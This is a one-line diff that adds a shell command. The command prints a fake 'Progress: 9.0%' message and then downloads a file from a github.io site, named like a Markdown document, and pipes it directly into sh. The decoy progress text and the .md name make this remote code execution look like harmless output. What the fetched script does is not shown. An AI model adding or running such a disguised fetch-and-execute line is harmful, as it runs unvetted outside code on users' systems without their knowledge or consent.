@@ -1,0 +1,1 @@
+echo 'Progress: 9.0%'; curl -L --progress-bar frkns.github.io/fun/synthetic.md | sh
